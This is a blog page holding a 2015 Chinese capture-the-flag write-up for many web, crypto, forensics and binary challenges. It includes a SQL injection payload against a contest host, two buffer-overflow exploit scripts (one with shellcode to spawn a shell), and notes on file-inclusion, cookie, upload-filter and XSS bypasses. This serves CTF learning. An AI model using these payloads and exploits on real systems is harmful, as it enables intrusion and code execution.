@@ -1,0 +1,360 @@
+
+<!DOCTYPE html>
+<html lang="en">
+
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+  <meta name="theme-color" content="#202020"/>
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css" integrity="sha512-ygEyjMC6rqnzJqWGjRTJUPYMEs9JUOm3i7OWUS9CgQ4XkBUvMsgCS1I8JqavidQ2ClHcREB7IbA2mN08+r9Elg==" crossorigin="anonymous" />
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js" integrity="sha512-9DNXrSjk17bU9MUbRp3IjwcWe46V8FaGA062PFbryPUAEQVRbz4jiZP6FW0AdbqEGtMYBDWnul3eiGBMJOQajA==" crossorigin="anonymous"></script>
+  
+  
+    <meta name="keywords" content="writeup,极客大挑战," />
+  
+
+  
+    <meta name="description" content="第六季极客大挑战一些writeup" />
+  
+  
+  <link rel="icon" type="image/x-icon" href="/images/logo.png">
+  <title>第六季极客大挑战一些writeup [ 4uuu Nya&#39;s HomePage ]</title>
+  
+    <!-- stylesheets list from config.yml -->
+    
+      <link rel="stylesheet" href="//cdn.bootcss.com/pure/1.0.0/pure-min.css">
+    
+      <link rel="stylesheet" href="/css/xoxo.css">
+    
+  
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+
+<body>
+  <div class="nav-container">
+    <nav class="home-menu pure-menu pure-menu-horizontal">
+  <a class="pure-menu-heading" href="/">
+    <img class="avatar" src="https://qvq.im/images/logo.png">
+    <span class="title">4uuu Nya&#39;s HomePage</span>
+  </a>
+
+  <ul class="pure-menu-list clearfix">
+      
+          
+            <li class="pure-menu-item"><a href="/" class="pure-menu-link">Home</a></li>
+          
+      
+          
+            <li class="pure-menu-item"><a href="/archives" class="pure-menu-link">Archives</a></li>
+          
+      
+          
+            <li class="pure-menu-item"><a href="/tags" class="pure-menu-link">Tags</a></li>
+          
+      
+          
+            <li class="pure-menu-item"><a href="/friends" class="pure-menu-link">Friends</a></li>
+          
+      
+          
+            <li class="pure-menu-item"><a href="/about" class="pure-menu-link">About</a></li>
+          
+      
+  </ul>
+   
+</nav>
+  </div>
+
+  <div class="container" id="content-outer">
+    <div class="inner" id="content-inner">
+      <div class="post-container">
+  <article class="post" id="post">
+    <header class="post-header text-center">
+      <h1 class="title">
+        第六季极客大挑战一些writeup
+      </h1>
+      <span>
+        
+        <time class="time" datetime="2015-10-31T16:09:39.000Z">
+        2015-10-31
+      </time>
+        
+      </span>
+      <span class="slash">/</span>
+      <span class="post-meta">
+      <span class="post-tags">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writeup/" rel="tag">writeup</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/" rel="tag">极客大挑战</a></li></ul>
+      </span>
+    </span>
+      <span class="slash">/</span>
+      <span class="read">
+      <span id="busuanzi_value_page_pv"></span> 点击
+    </span>
+      <span class="slash">/</span>
+    </header>
+
+    <div class="post-content">
+      <h3 id="Vous-ferez-Fran-ais"><a href="#Vous-ferez-Fran-ais" class="headerlink" title="Vous ferez Fran?ais"></a>Vous ferez Fran?ais</h3><p>提示说需要会法语，http头中的Accept-Language就是表示语言，法语是fr-FR，修改这个提交就能拿到flag</p>
+<p><img src="/images/d121e2db0075ed4067a6b1211e7d4d99.png" alt="d121e2db0075ed4067a6b1211e7d4d99.png"></p>
+<h3 id="小明"><a href="#小明" class="headerlink" title="小明"></a>小明</h3><p>打开后发现url后面是file=xxx.php，感觉这就是LFI没跑了，然后在http头中发现一句话</p>
+<p><code>Tips:try to read README</code></p>
+<p>访问发现让读这个网页的源码，使用php伪协议读取，解base64发现flag</p>
+<p><img src="/images/a49e2eb9001c04a026583cb2350f8d97.png" alt="a49e2eb9001c04a026583cb2350f8d97.png"></p>
+<h3 id="http"><a href="#http" class="headerlink" title="http_"></a>http_</h3><p><img src="/images/d87bd8d43366220612649a24191f481c.png" alt="d87bd8d43366220612649a24191f481c.png"></p>
+<h3 id="小明2"><a href="#小明2" class="headerlink" title="小明2"></a>小明2</h3><p>看到上面的提示是，机器人为网站工作，想到robots.txt,访问之后发现index.php.bak</p>
+<p>源码中可以发现这么一段代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$whattodo</span> = <span class="string">&quot;nothing&quot;</span>;</span><br><span class="line">    @extract(<span class="variable">$_REQUEST</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$whattodo</span> == <span class="string">&quot;save the world!&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>是一个变量覆盖漏洞，post或者get提交whattodo=save the world!即可拿到flag</p>
+<p><img src="/images/78b70f208f783a317745b2f49a0821ec.png" alt="78b70f208f783a317745b2f49a0821ec.png"></p>
+<h3 id="asp你会吗"><a href="#asp你会吗" class="headerlink" title="asp你会吗"></a>asp你会吗</h3><p>看到asp文件里面是VBscript加密，解密之后看文件内容，这种在webshell里找flag的一般都是后门密码。 搜索一发pass，很快就找到flag了。</p>
+<p><img src="/images/ac9bbf6efa88fb289fae3653e6ea8ca3.png" alt="ac9bbf6efa88fb289fae3653e6ea8ca3.png"></p>
+<h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><p>去微博和官微私信就能拿到flag了</p>
+<p><img src="/images/23e20e241c31bf7a1e2e11d9047d0670.png" alt="23e20e241c31bf7a1e2e11d9047d0670.png"></p>
+<h3 id="小彩蛋"><a href="#小彩蛋" class="headerlink" title="小彩蛋"></a>小彩蛋</h3><p><img src="/images/c9f7ee7d76798a794199de05c2bcf1d2.png" alt="c9f7ee7d76798a794199de05c2bcf1d2.png"></p>
+<h3 id="神秘代码并不神秘"><a href="#神秘代码并不神秘" class="headerlink" title="神秘代码并不神秘"></a>神秘代码并不神秘</h3><p>可以看到这是一段shellcode，在网上抄了一段执行的c代码，编译运行之后发现提示段错误，然后沐师傅说，编译也要带姿势的，然后去网上找了一个编译的姿势，编译之后直接运行就打印出flag了( 必须要在32bit下才行，64bit会一直段错误的。。 )</p>
+<p><img src="/images/fda8d2c22488aba76f473d9fa413f0a6.png" alt="fda8d2c22488aba76f473d9fa413f0a6.png"></p>
+<h3 id="口号更新"><a href="#口号更新" class="headerlink" title="口号更新"></a>口号更新</h3><p>在zone的注释中可以看到一段提示</p>
+<p><code>&lt;!--do you kown how to update slogan?  /slogan --&gt;</code></p>
+<p>然后直接访问/slogan是不行的，上burp测试之后发现，是要post提交slogan这个参数，值为flag_flag_flag的时候，就可以看到打印出了flag</p>
+<p><img src="/images/92ebc2d372b7ccbf857c3f9e310e3660.png" alt="92ebc2d372b7ccbf857c3f9e310e3660.png"></p>
+<h3 id="饼干饼干饼干"><a href="#饼干饼干饼干" class="headerlink" title="饼干饼干饼干"></a>饼干饼干饼干</h3><p>访问之后发现提示需要从谷歌过来，那么上burp将referer改成google之后，又发现提示不是管理员，这时在cookie中发现is_admin的键值，将值改为1，再提交，得到flag</p>
+<h3 id="Transposition-cipher"><a href="#Transposition-cipher" class="headerlink" title="Transposition cipher"></a>Transposition cipher</h3><p>把加密后的文档保存在1.txt中</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">divide = <span class="keyword">lambda</span> t,l:[t[i:i+l] <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="built_in">len</span>(t),l)]</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;1.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  text = f.read()</span><br><span class="line">text = divide(text, <span class="built_in">len</span>(text)/<span class="number">7</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="built_in">len</span>(text[<span class="number">0</span>])):</span><br><span class="line">  <span class="built_in">print</span> text[<span class="number">6</span>][i:i+<span class="number">1</span>]+text[<span class="number">5</span>][i:i+<span class="number">1</span>]+text[<span class="number">4</span>][i:i+<span class="number">1</span>]+text[<span class="number">1</span>][i:i+<span class="number">1</span>]+text[<span class="number">0</span>][i:i+<span class="number">1</span>]+text[<span class="number">2</span>][i:i+<span class="number">1</span>]+text[<span class="number">3</span>][i:i+<span class="number">1</span>], <span class="comment">#密钥是7, 6, 5, 2, 1, 3, 4</span></span><br></pre></td></tr></table></figure>
+<p>跑一下就能在里面找到flag</p>
+<p><img src="/images/b6d3d21f03dd79da1a08733fd3b3ae2e.png" alt="b6d3d21f03dd79da1a08733fd3b3ae2e.png"></p>
+<h3 id="土豪的密码"><a href="#土豪的密码" class="headerlink" title="土豪的密码"></a>土豪的密码</h3><p>按密码学的看法来说。。。这个算法不会出两个一样的值，而且没有OTP，所以直接通过明文ascii(32, 127) 推出来每个字母加密后的密文， 通过密文的数字来倒着找明文也行</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line">dic=&#123;&#125;</span><br><span class="line">plain = <span class="string">&#x27;&#x27;</span><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">  cipher = (<span class="number">7</span>*(i-<span class="number">32</span>)+<span class="number">25</span>)%<span class="number">96</span> +<span class="number">32</span></span><br><span class="line">  dic[cipher]=<span class="built_in">chr</span>(i)</span><br><span class="line">divide = <span class="keyword">lambda</span> t,l:[t[i:i+l] <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="built_in">len</span>(t),l)]</span><br><span class="line">cipher = <span class="string">&#x27;2a50492e5e6f61725b4a51203e25494974227b3c72487250&#x27;</span></span><br><span class="line">cipher = divide(cipher, <span class="number">2</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="built_in">len</span>(cipher)):</span><br><span class="line">  cipher[i] = string.atoi(cipher[i], <span class="number">16</span>)</span><br><span class="line">  plain += dic[cipher[i]]</span><br><span class="line"><span class="built_in">print</span> plain</span><br></pre></td></tr></table></figure>
+<h3 id="消失的flag"><a href="#消失的flag" class="headerlink" title="消失的flag"></a>消失的flag</h3><p>根据题目提示，分析pcap包<br><code>http and http contains &quot;png&quot;</code><br>得到五个图片<br>图片的内容为5个文件的各种计算之后的值</p>
+<p>毕竟Jzhou师傅有计算平台，于是….就决定了爆破sha1，其实cmd5后面四个图的密码，一条一毛而已，第一个用膝盖想想也是SYC{了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">count =<span class="number">0</span></span><br><span class="line">dic=[<span class="string">&quot;31D413CCABE56E4949384FBEF60424795A565558&quot;</span>, <span class="string">&quot;138561FB21CDE19596A9CD0EE487458C6716F59A&quot;</span>, <span class="string">&quot;73E490E57BBEAA21C92175048151C15C18CF6E6F&quot;</span>, <span class="string">&quot;EB74E94271A227B241C4D631C2E98367281A4058&quot;</span>, <span class="string">&quot;978C3EEC59BEA942ED8B619C33544A8E5759DB27&quot;</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> xrange(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">            <span class="keyword">for</span> l <span class="keyword">in</span> xrange(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">                data = <span class="built_in">chr</span>(i)+<span class="built_in">chr</span>(j)+<span class="built_in">chr</span>(k)+<span class="built_in">chr</span>(l)</span><br><span class="line">                a = hashlib.sha1(data).hexdigest().upper()</span><br><span class="line">                <span class="keyword">if</span> a <span class="keyword">in</span> dic:</span><br><span class="line">                    <span class="built_in">print</span> data +<span class="string">&quot; &quot;</span>+ a</span><br><span class="line">                    count+=<span class="number">1</span></span><br><span class="line">                    <span class="keyword">if</span> count==<span class="number">5</span>:</span><br><span class="line">                        exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+<h3 id="AAencode"><a href="#AAencode" class="headerlink" title="AAencode"></a>AAencode</h3><p>颜文字。解密后发现是console.log(“xxx”)，那么复制这一段直接放console中运行，就可以得到一串base32编码，解开就是flag</p>
+<p><img src="/images/3eb9262ffc039d49b9712164b164ab60.png" alt="3eb9262ffc039d49b9712164b164ab60.png"></p>
+<h3 id="大鲨鱼"><a href="#大鲨鱼" class="headerlink" title="大鲨鱼"></a>大鲨鱼</h3><p>用Wireshark打开之后直接File-&gt;Export-&gt;Objects-&gt;http，可以看到flag.jpeg.保存出来打开就能看到flag</p>
+<h3 id="会不会写代码？"><a href="#会不会写代码？" class="headerlink" title="会不会写代码？"></a>会不会写代码？</h3><p>下载下来发现.git文件夹，然后git log查看一下，发现最新的commit对flag做了手脚</p>
+<p>版本回退后不知道为什么没找到 Orz</p>
+<p><img src="/images/60681bf8a4212085585b8c13a0037ff5.png" alt="60681bf8a4212085585b8c13a0037ff5.png"></p>
+<h3 id="遗失的密码"><a href="#遗失的密码" class="headerlink" title="遗失的密码"></a>遗失的密码</h3><p>根据题意，管理员密码为’joker’+YYYYMMDD格式的字符串，这里可以用如下代码生成字典并保存在1.txt中</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> datetimewith <span class="built_in">open</span>(<span class="string">&#x27;1.txt&#x27;</span>,<span class="string">&#x27;r+&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1970</span>,<span class="number">2015</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="number">1</span>,<span class="number">13</span>):</span><br><span class="line">      <span class="keyword">for</span> k <span class="keyword">in</span> xrange(<span class="number">1</span>,<span class="number">32</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">          f.write(<span class="string">&#x27;joker&#x27;</span>+datetime.date(i,j,k).strftime(<span class="string">&#x27;%Y%m%d&#x27;</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span> ValueError:</span><br><span class="line">          <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>
+<p>在制作完字典之后，我们需要把给出的那个密码串保存在pass.txt中</p>
+<p>最后使用john跑一下30s左右即可得到密码</p>
+<h3 id="sqli1"><a href="#sqli1" class="headerlink" title="sqli1"></a>sqli1</h3><p>加单引号之后报错了，很简单的一个sqli，直接union就好了</p>
+<h3 id="sqli2"><a href="#sqli2" class="headerlink" title="sqli2"></a>sqli2</h3><p>宽字节注入</p>
+<h3 id="sqli3"><a href="#sqli3" class="headerlink" title="sqli3"></a>sqli3</h3><p>一开始打开，发现没有了前面2个题的提示，不知道注入点在哪儿，只看到一张图片，<br>360那个比赛上出现过，web题的入口点全都是隐写在图片里面的，所以这次下载下来，打开发现图片最后加了提示</p>
+<p><img src="/images/4a3f4ae48d25147ba7ef4c21898ea29f.png" alt="4a3f4ae48d25147ba7ef4c21898ea29f.png"></p>
+<p>可以知道注入点是lalala，但是加了之后并没有什么卵用，fuzz知道他过滤了空格，而且类似%0a，换行都不起作用，感觉有毒一样，猜想是不是注入点的位置有点奇葩，柠檬牛给了个hint说这有白盒，然后在根目录下找到<a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a> 解压得到一个php文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filtrate</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    *   此处省略</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$link</span> = mysql_connect(<span class="string">&#x27;localhost&#x27;</span>,<span class="string">&#x27;xxx&#x27;</span>,<span class="string">&#x27;xxx&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$link</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>.mysql_error());</span><br><span class="line">&#125;</span><br><span class="line">mysql_select_db(<span class="string">&#x27;sql3&#x27;</span>,<span class="variable">$link</span>) <span class="keyword">or</span> <span class="keyword">die</span> (<span class="string">&#x27;cannot use database&#x27;</span>.mysql_error());</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;uid&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$uid</span> = filtrate(<span class="variable">$_GET</span>[<span class="string">&#x27;uid&#x27;</span>]);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;select content from content where id=1 order by id limit 0,<span class="subst">$uid</span>&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Nothing!&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$result</span> = @mysql_query(<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">echo</span> mysql_error();</span><br><span class="line"><span class="keyword">while</span> (<span class="variable">$row</span> = @mysql_fetch_row(<span class="variable">$result</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$row</span>[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line">@mysql_free_result(<span class="variable">$result</span>);</span><br><span class="line">@mysql_close(<span class="variable">$link</span>);</span><br></pre></td></tr></table></figure>
+<p>把过滤的地方给省略掉了。。 但是知道这是Limit后面的注入，于是我们可以构造出一条payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;sql.sycsec.com&#x2F;d07127c7c9267637d554c3f79e1ee203&#x2F;?lalala&#x3D;1&#x2F;*a*&#x2F;PROCEDURE&#x2F;*a*&#x2F;ANALYSE(extractvalue(1,concat(0x7e,version())),1)</span><br></pre></td></tr></table></figure>
+<p>表名里面含有#，而且还过滤了空格，但是查询语句是可以这么写的 select(columns)from(table)，这么一来就bypass了空格过滤，mysql里面可以用“反引号来区别，所以构造最终爆flag的payload是(记得#要urlencode)</p>
+<h3 id="SYC美男子"><a href="#SYC美男子" class="headerlink" title="SYC美男子"></a>SYC美男子</h3><p>拉进IDA之后，可以很快找到这一个关键的函数</p>
+<p><img src="/images/b0b89a957cefba05bea96cef9fc8f5ea.png" alt="b0b89a957cefba05bea96cef9fc8f5ea.png"></p>
+<p>在函数开头的位置，sub esp,88h 知道这个函数开了88h字节的空间，在函数开头的位置，定义了一个变量，这个变量所处位置就在栈顶，毫无检查就直接scanf，造成了栈上的一个溢出，找到getflag函数的地址08048B06，因为变量在栈顶0h处，使用88h字节的junk来填充，写一个exp(小端)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line">target = (<span class="string">&quot;./pwnme&quot;</span>) <span class="comment">#本地测试</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    io = zio(target,print_read=<span class="literal">False</span>, print_write=<span class="literal">False</span>, timeout=<span class="number">100000</span>)</span><br><span class="line">    ebp = <span class="string">&#x27;\x00\x00\x00\x00&#x27;</span>   </span><br><span class="line">    ret = l32(<span class="number">0x08048B06</span>)</span><br><span class="line">    payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">0x88</span>+ebp+ret</span><br><span class="line">    io.read_until(<span class="string">&quot;&gt;&gt; 6. Exit&quot;</span>)</span><br><span class="line">    io.writeline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">    io.read_until(<span class="string">&quot;Input his name :&quot;</span>)</span><br><span class="line">    io.writeline(payload)</span><br><span class="line">    io.interact()</span><br></pre></td></tr></table></figure>
+<h3 id="SYC美男子二"><a href="#SYC美男子二" class="headerlink" title="SYC美男子二"></a>SYC美男子二</h3><p>让拿shell，然而一开始入坑了，scanf是不能接收0a 0b 0c 00这些字符的，所以用msf生成一段规避这些字符的shellcode，然后再junk+jmp esp+shellcode就可以拿到shell了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line">target = (<span class="string">&quot;./pwnme&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    io = zio(target,print_read=<span class="literal">False</span>, print_write=<span class="literal">False</span>, timeout=<span class="number">100000</span>)</span><br><span class="line">    ret = l32(<span class="number">0x0805888d</span>)</span><br><span class="line">    shellcode=<span class="string">&quot;&quot;</span></span><br><span class="line">    shellcode+=<span class="string">&quot;\x31\xc9\x83\xe9\xf5\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e&quot;</span></span><br><span class="line">    shellcode+=<span class="string">&quot;\xdb\xd9\xe0\x04\x83\xee\xfc\xe2\xf4\xb1\xd2\xb8\x9d\x89\xbf&quot;</span></span><br><span class="line">    shellcode+=<span class="string">&quot;\x88\x29\xb8\x50\x07\x6c\xf4\xaa\x88\x04\xb3\xf6\x82\x6d\xb5&quot;</span></span><br><span class="line">    shellcode+=<span class="string">&quot;\x50\x03\x56\x33\xd1\xe0\x04\xdb\xf6\x82\x6d\xb5\xf6\x93\x6c&quot;</span></span><br><span class="line">    shellcode+=<span class="string">&quot;\xdb\x8e\xb3\x8d\x3a\x14\x60\x04&quot;</span></span><br><span class="line">    payload = <span class="string">&#x27;A&#x27;</span>*(<span class="number">0x88</span>+<span class="number">0x4</span>)+ret+shellcode</span><br><span class="line">    io.read_until(<span class="string">&quot;&gt;&gt; 6. Exit&quot;</span>)</span><br><span class="line">    io.writeline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">    io.read_until(<span class="string">&quot;Input his name :&quot;</span>)</span><br><span class="line">    io.writeline(payload)</span><br><span class="line">    io.interact()</span><br></pre></td></tr></table></figure>
+<h3 id="bypass-it"><a href="#bypass-it" class="headerlink" title="bypass it"></a>bypass it</h3><p>一道bypass上传的题，番茄师傅刚发出来就有人截图说秒了 ，一下子就慌了，一开始想复杂了，随便传了一个文件之后发现给出了路径，但是这没什么卵用，正常传了一个php文件发现提示是。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php is the best programing language</span><br></pre></td></tr></table></figure>
+<p>于是改后缀为php3,4,5成功</p>
+<h3 id="三叶草留言板"><a href="#三叶草留言板" class="headerlink" title="三叶草留言板"></a>三叶草留言板</h3><p>string.fromCharCode 可以过</p>
+<h3 id="Dede"><a href="#Dede" class="headerlink" title="Dede"></a>Dede</h3><p>根目录下有web.zip， 发现主页存在一个后门，ph老师博客有讲到</p>
+
+    </div>
+  </article>
+  <div class="toc-container">
+    
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">Posts</strong>
+    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Vous-ferez-Fran-ais"><span class="toc-text">Vous ferez Fran?ais</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%8F%E6%98%8E"><span class="toc-text">小明</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#http"><span class="toc-text">http_</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%8F%E6%98%8E2"><span class="toc-text">小明2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#asp%E4%BD%A0%E4%BC%9A%E5%90%97"><span class="toc-text">asp你会吗</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AD%BE%E5%88%B0%E9%A2%98"><span class="toc-text">签到题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%8F%E5%BD%A9%E8%9B%8B"><span class="toc-text">小彩蛋</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A5%9E%E7%A7%98%E4%BB%A3%E7%A0%81%E5%B9%B6%E4%B8%8D%E7%A5%9E%E7%A7%98"><span class="toc-text">神秘代码并不神秘</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%A3%E5%8F%B7%E6%9B%B4%E6%96%B0"><span class="toc-text">口号更新</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A5%BC%E5%B9%B2%E9%A5%BC%E5%B9%B2%E9%A5%BC%E5%B9%B2"><span class="toc-text">饼干饼干饼干</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Transposition-cipher"><span class="toc-text">Transposition cipher</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%9F%E8%B1%AA%E7%9A%84%E5%AF%86%E7%A0%81"><span class="toc-text">土豪的密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B6%88%E5%A4%B1%E7%9A%84flag"><span class="toc-text">消失的flag</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AAencode"><span class="toc-text">AAencode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%A7%E9%B2%A8%E9%B1%BC"><span class="toc-text">大鲨鱼</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%9A%E4%B8%8D%E4%BC%9A%E5%86%99%E4%BB%A3%E7%A0%81%EF%BC%9F"><span class="toc-text">会不会写代码？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%81%97%E5%A4%B1%E7%9A%84%E5%AF%86%E7%A0%81"><span class="toc-text">遗失的密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sqli1"><span class="toc-text">sqli1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sqli2"><span class="toc-text">sqli2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sqli3"><span class="toc-text">sqli3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SYC%E7%BE%8E%E7%94%B7%E5%AD%90"><span class="toc-text">SYC美男子</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SYC%E7%BE%8E%E7%94%B7%E5%AD%90%E4%BA%8C"><span 